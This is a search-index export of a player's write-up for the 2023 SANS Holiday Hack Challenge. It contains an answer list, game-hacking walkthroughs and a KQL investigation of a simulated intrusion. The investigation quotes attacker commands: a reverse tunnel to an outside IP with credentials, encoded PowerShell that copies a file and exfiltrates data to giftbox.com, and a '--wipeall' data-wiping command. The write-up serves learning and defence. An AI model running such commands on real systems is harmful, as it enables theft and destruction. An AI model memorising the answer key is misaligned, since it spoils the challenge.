{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey. Featuring 6: Geese A-Lei'ing","text":""},{"location":"#introduction","title":"Introduction","text":"<p>I think this year was probably my favourite year of KringleCon. The wide variety of challenges was amazing; from trivial cheating on games all the way through to interfering with satellite operations (which must be one of the most expensive and dangerous targets, secondary only to weapons/infrastructure?). None of the challenges felt too contrived to me and the vibe of the game brought back so much nostalgia from my childhood (I really wish I'd known how to break into locker locks when I was in high school!). Huge thanks to everyone involved in making this possible!</p> <p>Unfortunately, I think this year is also my worst write-up (apart from my very first when I didn't realise I was meant to do a write-up until the due date and hadn't kept any notes or anything). A couple of big (fortunately positive) life events meant I didn't have much time or energy to spend on this this year. If you're wondering why I don't talk much about my missteps, please be assured that it's not because I didn't make a lot, it's just that I didn't have time to chronical them.</p> <p>Normally I really enjoy the community-vibe for the Holiday Hack but the time limits meant I didn't get involved much this year. Thanks so much to @coopreme, @Dzhernikov, @devastati0n, @Voldetort and @chacho for giving me hints when I felt like there was no hope of solving the challenges in time. I also want to give a special thanks to Crahan for the template - I'm not sure I would've completed this writeup without it.</p> <p>Links to each of the objectives are on the left, and below. I didn't have time to complete the Bonus Fishing Challenge, unfortunately. I've also linked to some Easter eggs, but haven't had a chance to write much about them.</p> <p>50-page submission limit</p> <p>Each year there's a huge number of write-ups that need to be reviewed by the Counter Hack team. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information.</p> Navigation tip <p>Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p> In-game navigation <p>One of the improvements in this year's Holiday Hack was the immediate ability to teleport any where you've already been from your badge. When you're sailing, there's also a map on the bottom left showing your location, the Geese Islands and each of the ports you know about in red. Many of the conversations you've had with the Elves are also recorded along with the area they were in so it's much easier to jump between challenge locations.</p>"},{"location":"#answers","title":"Answers","text":"<p>1. Holiday Hack Orientation - </p> <p>Either type <code>answer</code> in the top panel, or run <code>runtoanswer</code> and then type <code>answer</code> in the bottom panel</p> <p>2. Snowball Fight - </p> <p>Select the right console and set <code>player.health = 999999</code>, <code>santaThrowDelay = 99999</code> and <code>elfThrowDelay = 99999</code></p> <p>3. Linux 101 - </p> <p>Troll wrangling</p> <p>4. Reportinator - </p> <p>3, 6 and 9 are hullicinations</p> <p>5. Azure 101 - </p> <p>Great, you did it all!</p> <p>6. Luggage Lock - </p> <p>8602</p> <p>7. Linux PrivEsc - </p> <p>santa</p> <p>8. Faster Lock Combination - </p> <p>17 23 33</p> <p>9. Game Cartridges: Vol 1 - </p> <p>santaconfusedgivingplanetsqrcode</p> <p>10. Game Cartridges: Vol 2 - </p> <p>GL0RY</p> <p>11. Game Cartridges: Vol 3 - </p> <p>!tom+elf!.</p> <p>12. NaN - </p> <p>NaN</p> <p>13. KQL Kraken Hunt - </p> <p>Beware the Cube that Wombles</p> <p>14. Phish Detection Agency - </p> <p>You've cracked the case!</p> <p>15. Hashcat - </p> <p>IluvC4ndyC4nes!</p> <p>16. Elf Hunt - </p> <p>Well done! You've brilliantly won Elf Hunt!</p> <p>17. Certificate SSHenanigans - </p> <p>Gingerbread</p> <p>18. The Captain's Comms - </p> <p><code>10426Hz' '12/24</code> <code>12:00</code></p> <p>19. Active Directory - </p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p> <p>20. Space Island Door Access Speaker - </p> <p>Are you like a master spy or something?</p> <p>21. Camera Access - </p> <p>Conquer Holiday Season!</p> <p>22. Diversion - </p> <p>numerical_mode = 1</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>Narrative</p> <p>Just sit right back and you\u2019ll hear a tale, A tale of a yuletide trip That started from a tropic port, Aboard this tiny ship Santa and his helpful elves To Geese Islands did go Continuing their merry work O'er sand instead of snow New this year: a shiny tool The elves logged in with glee What makes short work of many tasks? It's ChatNPT. It's ChatNPT From images to APIs This AI made elves glad But motivations were unknown So was it good or bad? Could it be that NPT Was not from off-the-shelf? Though we'll forgive and trust again We'd found a naughty elf This fancy AI tool of ours With all our work remained Not good or bad, our online friend Just did as it was trained Surely someone's taint must be Upon our AI crutch Yes indeed, this bold new world Bore Jack Frost's icy touch Though all's returned to steady state There's one thing that we know We'll all be needed once again When Santa's back on snow</p> <p></p> <p>Where's Wombley?</p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":""},{"location":"easter_eggs/#naan","title":"NaaN","text":"<p>The JavaScript code in the Naan challenge is wild. I guess Shifty looked a little different originally?</p> <pre><code>//card = this.add.image(screenCenterX, screenCenterY, 'card').setOrigin(0.5, 0.5)\n        //card.scale = 0.1;\n        //NotAnOrcElfTalking.anims.play('arms');\n        /*\n        dvoraks.on('animationcomplete', function() {\n            //dvoraks.setFrame(0)\n        });\n        cyberdroids.setVisible(false)\n                explosion.setFrame(10)\n        explosion.setAlpha(0.75)\n        t1 = this.tweens.create({\n            targets: [dvoraks,cyberdroids,smithereens],\n            angle: '+=1',\n            //x: '+=100',\n            //y: '+=0',\n            duration: 400,\n            completeDelay: 0,\n            onComplete: function () {\n                t2.play()\n            },\n        })\n        dvoraks_DialogueBox = createTextBox(this, screenCenterX, 12+(DialogueBoxHeight/2), {\n                wrapWidth: 500,\n                fixedWidth: 500,\n                fixedHeight: 65,\n            }).start(dvoraks_content, 20);\n        */\n\n       /*\nfunction talk() {\n    NotAnOrcElfTalking.setVisible(true)\n    NotAnOrcElfArms.setVisible(false)\n    NotAnOrcElfTalking.anims.play('talking');\n}\n*/\n\n/*function TalkAnimation(alien_obj, time=5000) {\n    alien_obj.anims.play(alien_obj.aname+'_talk');\n    setTimeout(()=&gt;{\n        alien_obj.anims.stop();\n        alien_obj.anims.play(alien_obj.aname+'_idle');\n    }, time)\n}*/\n\n/*\nvar check_state = function() {\n    $.post(\"action\", {\"check_state\": \"check_state\"}, function(response){\n        if (response.smithereens !== undefined &amp;&amp; response.smithereens === true) {\n            EndGame()\n        } else if (response.cyberdroids !== undefined &amp;&amp; response.cyberdroids === true) {\n            alien_death(dvoraks)\n            setTimeout(()=&gt;{\n                alien_death(cyberdroids)\n            }, 2000)\n        } else if (response.dvoraks !== undefined &amp;&amp; response.dvoraks === true) {\n            alien_death(dvoraks)\n        }\n    }).fail(function(response) {\n        console.error(response.status+': '+ response.responseJSON.data)\n    });    \n}\nvar submit_answer = function(value) {\n    $.post(\"action\", {\"answer\": value}, function(response){\n        if (response.data !== undefined) {\n            console.log( response.data )\n            DialogueResponse(response)\n        }\n    }).fail(function(response) {\n        console.error(response.status+': '+ response.responseJSON.data)\n    });\n}\n*/\n</code></pre> <p>The images:  </p>"},{"location":"easter_eggs/#active-directory","title":"Active Directory","text":"<p>The contents of todo.txt 1. Bake some cookies. 2. Restrict access to C:\\FileShare\\super_secret_research to only researchers so everyone cant see the folder or read its contents 3. Profit</p> <p>There were also some PDFs: * Cookies_Recipe.pdf * Cookies.pdf * Signature_Cookies.pdf</p>"},{"location":"easter_eggs/#staff","title":"Staff","text":""},{"location":"easter_eggs/#the-art-and-music","title":"The Art and Music","text":"<p>The various art and music included in this year's holiday hack was top notch. I want to put a special shout out to the song based on Rock Me Armadeus and the Turtle Toy</p> <p></p>"},{"location":"objectives/o10/","title":"Game Cartridges: Vol 2","text":"<p>Difficulty:  Direct link: Vol II</p>"},{"location":"objectives/o10/#objective","title":"Objective","text":"<p>Request</p> <p>Find the second Gamegosling cartridge and beat the game</p> Angel Candysalt <p>The name's Angel Candysalt, the great treasure hunter! A euphemism? No, why do people always ask me that?? Anyways, I came here to nab the treasure hidden in this ship graveyard, only to discover it's protected by this rusted maze. That must be why all these old ships are here. Their crew came to find the treasure, only to get lost in the labrynth. At least it's obvious where this one is. See that shiny spot over to the right? That's gotta be where it is! If only I had a bird's eye view. But how to get there? Up? Down? Left? Right? Oh well, that's your problem now! Come back if you can find your way to it, and I'll tell you some secrets I've heard about this one.</p>"},{"location":"objectives/o10/#hints","title":"Hints","text":"Gameboy 2 <p>Try poking around Pixel Island. There really aren't many places you can go here, so try stepping everywhere and see what you get!</p> Gameboy 2 <p>1) This feels the same, but different! 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding. 3) I think I may need to get a DIFFerent perspective. 4) I wonder if someone can give me a few pointers to swap.</p>"},{"location":"objectives/o10/#solution","title":"Solution","text":""},{"location":"objectives/o10/#find-the-cartridge","title":"Find the cartridge","text":"<p>We find Angel Candysalt in Rusty Quay who tells us that the cartridge is in the middle of a maze. Fortunately, we can zoom out in the browser to see the whole path:</p> <p> </p>"},{"location":"objectives/o10/#download-the-game","title":"Download the game","text":"<p>After we collect the game, we can try to play it but we get stopped by T-Wiz who won't let us progress. So we're obviously going to have to change something about the game to get through... We should start by investigating how the game works.</p> <p>By looking at the developer tools in the browser, we can see it's run using web assembly. But alongside the javascript, html and webassembly scripts, there's also a request for game0.gb. Searching for the extension shows it's a Game Boy Rom file so perhaps we can run it in an emulator and hack it that way?</p>"},{"location":"objectives/o10/#two-versions","title":"Two versions?!","text":"<p>Before we do so, the naming is a bit interesting <code>game0.gb</code>. I wonder if there are other versions? If we try the same url but with <code>game.gb</code>, <code>game1.gb</code> and <code>game2.gb</code>, we see that there are in fact two versions.</p> Tinsel Upatree <p>Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions!</p> <p>When we play the other version, it appears exactly the same but flipped upside down. I wonder what else is different? Since we can't get any further, we should try just comparing the bytes:</p> <p></p> <p>If we just start slowly changing the bytes from game0 to those in game1, perhaps that will make T-Wiz move?</p> Hex Editors <p>Most editors should be able to let you change the bytes. I normally use VSCode for viewing hex but it didn't seem great at letting you compare bytes though. vbindiff and hexfiend both seemed pretty good.</p> <p>Instead of moving T-Wiz, by starting from top-to-bottom, we end up moving the end goal to be above T-Wiz where we can reach it:</p> <p></p>"},{"location":"objectives/o10/#the-final-challenge","title":"The final challenge","text":"<p>After entering the portal, we end up in a room with what looks like a pokeball and a radio.</p> <p></p> <p>We need our volume on for this bit because talking to them just emits a series of beeps that sound an awful lot like morsecode to me...  I don't understand morsecode, so manually translating it, or even just recording it, wasn't an option for me. We could probably pull the data from the game somehow, but it's easier to record sound through something like Quicktime player or a phone:</p> <p>The morsecode</p> <p>There are plenty of online sites that will take that input and translate it for us:</p> <p>T E S T T T T T T T T T T T T R Y G L 0 R Y G L 0 R Y G L 0 R Y G L 0 R Y G L 0 R Y G L 0 R Y G L 0 R Y G L 0 R Y G L 0 R Y G L 0 R Y G R</p> <p>Answer</p> <p>GL0RY</p>"},{"location":"objectives/o10/#response","title":"Response","text":"<p>Angel Candysalt</p> <p>The life of a treasure hunter isn't easy, but it sure is exciting! Oh it's a video game, I love video games! But you've claimed this treasure, nicely done. Now, about those secrets I've been told. They're pretty cryptic, but they are. Hopefully that helps with something! You have all three? Wow, you must be the greatest treasure hunter that ever lived!</p>"},{"location":"objectives/o11/","title":"Game Cartridges: Vol 3","text":"<p>Difficulty:  Direct link: Vol III</p>"},{"location":"objectives/o11/#objective","title":"Objective","text":"<p>Request</p> <p>Find the third Gamegosling cartridge and beat the game</p> Tinsel Upatree <p>I can't believe I was actually able to find this underground cavern! I discovered what looked liike an old pirate map in the attic of one of those huts in Rainraster Cliffs, and it actually led somewhere! But now that I've seen where it leads, I think this might've been a bad idea. This place is scary! Maybe you want to take it from here? I'm sure that cartridge is right nearby. Start walking around! Once you run into it, check back with me and I'll tell you what I know about winning. Good luck!</p>"},{"location":"objectives/o11/#hints","title":"Hints","text":"Gameboy 2 <p>1) This one is a bit long, it never hurts to save your progress! 2) 8bit systems have much smaller registers than you're used to. 3) Isn't this great?!? The coins are OVERFLOWing in their abundance.</p>"},{"location":"objectives/o11/#solution","title":"Solution","text":"<p>The cartridge is once again duck-shaped and is found pretty easily by walking across to the left of Driftbit Grotto</p> <p></p> <p>Like in the previous objective, we want to open this one in our own emulator so we first download the <code>game.gb</code>.</p> Ghidra <p>I originally tried to solve this by using Ghidra to look for the overflow message and to figure out where that was called from. You can probably do that if you set Ghidra up to run the emulation (there are guides of how online), but it's not the easiest approach since the static decompilation couldn't find references to the string. It also confused me since I saw some of the later-game strings and expected Jared to change his message when I had the correct score.</p> <p>Playing through this game normally, we'll eventually see the coins overflow after reaching 998 and we'll also see Jared talk about how back in his day, it was \"three nines\". That seems to imply the goal is to get a score of 999, but how?</p> The Manual Option <p>I originally tried saving the state file with different values and comparing to find which had changed. But a lot of values change (and equally, a lot remain the same) so it's a bit tedious to do manually. I thought about programming something to automatically find the bytes, but fortunately that's already been done for me!</p> <p>The easiest way to solve this is to open the game in BGB and follow their cheat searcher guide</p> Cheat searching <p>Open the game in BGB and then open the cheat searcher by choosing right-click &gt; other &gt; cheat searcher. You can try 8 bit values, since those would make sense, but I found 16 bit values worked better. Click start and then wander around a bit without collecting coins. Make sure <code>values not equal to</code> is selected and periodically click <code>search</code>. Now, collect 1, 10 and 100 coins so that your score is <code>111</code>. This means that the value will be preserved regardless of whether the data is stored in one byte or separately (it's stored separately). Make sure values <code>above the previous value</code> is selected and click <code>search</code>. Go back and save so that your score returns to 0. Make sure <code>values below the previous value</code> is selected, and click <code>search</code>. You should find about five values are left. Modify each of these values to be 9 by right clicking the value &gt; go here in debugger. Right click &gt; freeze RAM address and enter 09.</p> <p></p> <p>After we've found the RAM values and updated them to 9, change areas in the game and we'll see our score is now 999.</p> Glitches <p>You'll need to update more than just the three values shown as the score which is why we don't filter down to only three. If you don't, the game is still playable and winnable, but the images get a bit broken and you have to 'guess' where the different objects are. If you try to set the values to their max ('FF'), things also get glitchy. </p> <p>Now when we continue to the \"end\" of the game, we see a platform has appeared.</p> Save State <p>It's pretty easy to mess up this jump (and the entire game, really), so using the state save and quick load saved a lot of my sanity, especially before this jump!</p> <p></p> <p>After we leap over the two platforms and bypass or kill one more enemy, we get to the final room. If we've updated the values correctly, we see the game as intended. If not, we see half-images scattered over the room, but we can win anyway by ignoring the visual input and just treating them as if they are displayed as intended.</p> <p></p> <p></p> <p>Answer</p> <p>!tom+elf!</p>"},{"location":"objectives/o11/#response","title":"Response","text":"<p>Tinsel Upatree</p> <p>Whoa, you found it! What version is it? Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions! You have all three? What a glorious collection!</p>"},{"location":"objectives/o12/","title":"Na'an","text":"<p>Difficulty:  Direct link: nannannannannannan</p>"},{"location":"objectives/o12/#objective","title":"Objective","text":"<p>Request</p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!</p> Shifty McShuffles <p>Hey there, stranger! Fancy a game of cards? Luck's on your side today, I can feel it. Step right up, test your wit! These cards could be your ticket to fortune. Trust me, I've got a good eye for winners, and you've got the look of luck about you. Plus, I'd wager you've never played this game before, as this isn't any ordinary deck of cards. It's made with Python. The name of the game is to bamboozle the dealer. So whad'ya think? Are you clever enough?</p>"},{"location":"objectives/o12/#hints","title":"Hints","text":"The Upper Hand <p>Shifty said his deck of cards is made with Python. Surely there's a weakness to give you the upper hand in his game.</p> Stump the Chump <p>Try to outsmart Shifty by sending him an error he may not understand.</p>"},{"location":"objectives/o12/#solution","title":"Solution","text":"<p>This is a pretty simple game; you choose five unique numbers from 0-9. Whoever picks the lowest and highest number gets a point for each, but any numbers that you both pick are cancelled out.</p> <p>In theory, no one should ever win or lose: as long as you choose the numbers strategically, you can guarantee the other player cannot get both the highest and lowest numbers (eg the two lowest and two highest + whatever, or the three lowest + highest + whatever, etc).</p> <p>My first thought, before looking at the hints, was to attempt fractional numbers since they're technically allowed according to the rules. Unfortunately Shifty rejects these, along with negative numbers or obvious non-numbers.</p> <p>A previous Sans Holiday Hack talk discussed how NaN causes issues for Python when sorting arrays, so that's an option:</p> <pre><code>&gt;&gt;&gt; x = float(\"NaN\")\n&gt;&gt;&gt; x &lt; 0\nFalse\n&gt;&gt;&gt; x &gt; 0\nFalse\n</code></pre> <p>And indeed, inputting 'NaN' along with any four other numbers gets us a win</p> <p></p> Inf <p>In theory, \"inf\" should be allowed by Python for the same reason \"nan\" is. <pre><code>&gt;&gt;&gt; float(\"inf\")\ninf\n</code></pre></p> <p>However, it's blocked by the JavaScript: <pre><code>function IsValid(text) {\n    return Boolean(text.match(/^[n0-9][na]{0,2}$/ig))\n}\n</code></pre> Modifying the network request also returns an error message, so it doesn't seem like the program is running Python quite as literally as I'd expected. If I had more time, I would have loved to dive into it further.</p>"},{"location":"objectives/o12/#response","title":"Response","text":"<p>Shifty McShuffles</p> <p>Well, you sure are more clever than most of the tourists that show up here. I couldn't swindle ya, but don't go telling everyone how you beat me! An elf's gotta put food on the table somehow, and I'm doing the best I can with what I got.</p>"},{"location":"objectives/o13/","title":"KQL Kraken Hunt","text":"<p>Difficulty:  Direct link: Kusto</p>"},{"location":"objectives/o13/#objective","title":"Objective","text":"<p>Request</p> <p>Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.</p> Tangle Coalbox <p>Greetings, rookie. Tangle Coalbox of Kusto Detective Agency here. I've got a network infection case on Film Noir Island that needs your expertise. Seems like someone clicked a phishing link within a client's organization, and trouble's brewing I'm swamped with cases, so I need an extra pair of hands. You up for the challenge? You'll be utilizing the Azure Data Explorer and those KQL skills of yours to investigate this   incident. Before you start, you'll need to create a free cluster. Keep your eyes peeled for suspicious activity, IP addresses, and patterns that'll help us crack this case wide open. Remember, kid, time is of the essence. The sooner we can resolve this issue, the better. If you run into any problems, just give me a holler, I've got your back. Good hunting, and let's bring this cyber criminal to justice. Once you've got the intel we need, report back and we'll plan our next move. Stay sharp, rookie.</p>"},{"location":"objectives/o13/#hints","title":"Hints","text":"File Creation <p>Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table</p> Insert Hint 2 Title <p>Once you get into the Kusto trainer, click the blue Train me for the case button to get familiar with KQL.</p>"},{"location":"objectives/o13/#solution","title":"Solution","text":""},{"location":"objectives/o13/#setting-up","title":"Setting up","text":"<p>Set up a free cluster here: https://dataexplorer.azure.com/freecluster and then link it into the Kusto site: https://detective.kusto.io/sans2023 as described.</p> <p>Season 1 / Season 2</p> <p>I was a little confused by the tutorial and imported the \"Season 1\" and \"Season 2\" tables. You don't want those and should delete them if you have already imported them.</p> <p>In the <code>Welcome to SANS Holiday Hack 2023!</code>, there's an <code>execute database script</code>. Click the run button to get access to the elves' data.</p>"},{"location":"objectives/o13/#welcome-to-operation-giftwrap-defending-the-geese-island-network","title":"Welcome to Operation Giftwrap: Defending the Geese Island network","text":"Background <p>An urgent alert has just come in, 'A user clicked through to a potentially malicious URL involving one user.' This message hints at a possible security incident, leaving us with critical questions about the user's intentions, the nature of the threat, and the potential risks to Santa's operations. Your mission is to lead our security operations team, investigate the incident, uncover the motives behind email, assess the potential threats, and safeguard the operations from the looming cyber threat. The clock is ticking, and the stakes are high - are you up for this exhilarating challenge? Your skills will be put to the test, and the future of Geese Island's digital security hangs in the balance. Good luck! The alert says the user clicked the malicious link 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'</p> <p>We can find the relevant logs by running: <pre><code>Email\n| where link == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'\n</code></pre></p> <p>Q. What is the email address of the employee who received this phishing email?</p> <p>A. alabaster_snowball@santaworkshopgeeseislands.org</p> <p>Q. What is the email address that was used to send this spear phishing email?</p> <p>A. cwombley@gmail.com</p> <p>Q. What was the subject line used in the spear phishing email?</p> <p>A. [EXTERNAL] Invoice foir reindeer food past due</p>"},{"location":"objectives/o13/#someone-got-phished-lets-dig-deeper-on-the-victim","title":"Someone got phished! Let's dig deeper on the victim...","text":"Background <p>Nicely done! You found evidence of the spear phishing email targeting someone in our organization. Now, we need to learn more about who the victim is! If the victim is someone important, our organization could be doomed! Hurry up, let's find out more about who was impacted!</p> <p>We can find more about the impacted employee by using the email address we found in the last section: <pre><code>Employees\n| where email_addr == 'alabaster_snowball@santaworkshopgeeseislands.org'\n</code></pre></p> <p>Q. What is the role of our victim in the organization?</p> <p>A. Head Elf</p> <p>Q. What is the hostname of the victim's machine?</p> <p>A. Y1US-DESKTOP</p> <p>Q. What is the source IP linked to the victim?</p> <p>A. 10.10.0.4</p>"},{"location":"objectives/o13/#thats-not-good-what-happened-next","title":"That's not good. What happened next?","text":"Background <p>The victim is Alabaster Snowball? Oh no... that's not good at all! Can you try to find what else the attackers might have done after they sent Alabaster the phishing email? Use our various security log datasources to uncover more details about what happened to Alabaster.</p> <p>Q. What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!</p> <p>We should be able to find this by looking at the outbound connections to the URL we were given initially:</p> <pre><code>OutboundNetworkEvents\n| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'\n</code></pre> <p>A. 2023-12-02T10:12:42Z</p> <p>Q. What file is dropped to Alabaster's machine shortly after he downloads the malicious file?</p> <p>A file must've been created and we already know the hostname of Alabaster's machine and the earliest date it could have been created (from above). So we just need to filter by that, and order by the earliest:</p> <pre><code>FileCreationEvents\n| where hostname == 'Y1US-DESKTOP'\n| where timestamp &gt;= make_datetime(2023, 12, 02, 10, 12, 42)\n| order by timestamp asc\n| take 2\n</code></pre> <p>The first result is the malicious .docx file, the second is the executable we care about:</p> <p>A. giftwrap.exe</p>"},{"location":"objectives/o13/#a-compromised-host-time-for-a-deep-dive","title":"A compromised host! Time for a deep dive.","text":"Background <p>Well, that's not good. It looks like Alabaster clicked on the link and downloaded a suspicious file. I don't know exactly what giftwrap.exe does, but it seems bad. Can you take a closer look at endpoint data from Alabaster's machine? We need to figure out exactly what happened here. Word of this hack is starting to spread to the other elves, so work quickly and quietly!</p> <p>Q. The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?</p> <p>We know the hostname and the rough timestamp, so let's see if we can find anything suspicious: <pre><code>ProcessEvents\n| where hostname == 'Y1US-DESKTOP'\n| where timestamp &gt;= make_datetime(2023, 12, 02, 10, 12, 42)\n| order by timestamp asc\n</code></pre> Sure enough, this event is recorded shortly after the compromise: <code>\"ligolo\" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof</code></p> <p>A. 113.37.9.17</p> <p>Q. What is the timestamp when the attackers enumerated network shares on the machine?</p> <p>If we scroll down a bit from the logs above, we find: <pre><code>2023-12-02T16:44:10Z net view /DOMAIN\n2023-12-02T16:51:44Z net share\n</code></pre> You'd think it'd be <code>net view</code>, but no, <code>net share</code> is used to enumerate the shares.</p> <p>A. 2023-12-02T16:51:44Z</p> <p>Q. What was the hostname of the system the attacker moved laterally to?</p> <p>If we keep scrolling through those logs to see if anything interesting happens, we eventually get to this log:</p> <p><code>bfc3e1967ffe2b1e6752165a94f7f84a216300711034b2c64b1e440a54e91793 cmd.exe /C net use \\\\NorthPolefileshare\\c$ /user:admin AdminPass123</code></p> <p>A. NorthPolefileshare</p>"},{"location":"objectives/o13/#a-hidden-message","title":"A hidden message","text":"Background <p>Wow, you're unstoppable! Great work finding the malicious activity on Alabaster's machine. I've been looking a bit myself and... I'm stuck. The messages seem to be garbled. Do you think you can try to decode them and find out what's happening? Look around for encoded commands. Use your skills to decode them and find the true meaning of the attacker's intent! Some of these might be extra tricky and require extra steps to fully decode! Good luck! If you need some extra help with base64 encoding and decoding, click on the 'Train me for this case' button at the top-right of your screen.</p> <p>Q. When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?</p> <p>We can look for encoded messages since they should include PowerShell's <code>-enc</code> option: <pre><code>ProcessEvents\n| where hostname == 'Y1US-DESKTOP'\n| where process_commandline contains '-enc'\n| where timestamp &gt;= make_datetime(2023, 12, 02, 10, 12, 42)\n| order by timestamp asc\n</code></pre></p> <p>The first is just an update and likely not attacker-initiated</p> <p>A. 2023-12-24T16:07:47Z</p> <p>Q. What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)?</p> <p>The command run was: <code>C:\\Windows\\System32\\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn</code></p> <p><pre><code>$ echo \"KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn\" | base64 -d\n( 'txt.tsiLeciNythguaN\\potkseD\\:C txt.tsiLeciNythguaN\\lacitirCnoissiM\\$c\\erahselifeloPhtroN\\\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''% \n</code></pre> Simple in-brain reversing gets us:</p> <p>A. NaughtyNiceList.txt             `</p> <p>Q. The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?</p> <p>The next command is: <code>C:\\Windows\\System32\\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=</code></p> <p>which decodes to: <code>[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|&amp; ((gv '*MDr*').NamE[3,11,2]-joiN</code></p> <p>I figured this was a good use of ChatGPT, since I'm meant to be using it for the writeup, and it... gave me the answer but not in a page-limit-friendly-way, so let's just show the Python option:</p> <pre><code>&gt;&gt;&gt; for x in [100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101]:\n    print(chr(x), end=\"\")\n... \ndownwithsanta.exe -exfil C:\\\\Desktop\\\\NaughtNiceList.docx \\\\giftbox.com\\file\n</code></pre> <p>A. giftbox.com</p>"},{"location":"objectives/o13/#the-final-step","title":"The final step!","text":"Background <p>Wow! You decoded those secret messages with easy! You're a rockstar. It seems like we're getting near the end of this investigation, but we need your help with one more thing... We know that the attackers stole Santa's naughty or nice list. What else happened? Can you find the final malicious command the attacker ran?</p> <p>The last command was <code>C:\\Windows\\System32\\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=</code> Which decodes to <code>C:\\Windows\\System32\\downwithsanta.exe --wipeall \\\\\\\\NorthPolefileshare\\\\c</code></p> <p>Q. What is the name of the executable the attackers used in the final malicious command? A. downwithsanta.exe</p> <p>Q. What was the command line flag used alongside this executable? A. --wipeall</p>"},{"location":"objectives/o13/#congratulations","title":"Congratulations","text":"Background <p>Congratulations, you've cracked the Kusto detective agency section of the Holiday Hack Challenge! By now, you've likely pieced together the broader narrative of the alert we received. It all started with Wombley Cube, a skilled Craftsperson, and a malicious insider, who sent an email to the esteemed head elf, Alabaster Snowball. This seemingly innocent email contained a dangerous link leading to the malicious domain, MadElvesNorthPole.org. Alabaster Snowball, from his PC, unwittingly clicked on the link, resulting in the download and execution of malicious payloads. Notably, you've also discerned Wombley Cube's ulterior motive: to pilfer a copy of Santa's naughty or nice list and erase the data on the share drive containing critical information to Santa's operations. Kudos to you! To earn credit for your fantastic work, return to the Holiday Hack Challenge and enter the secret phrase which is the result of running this query: <code>print 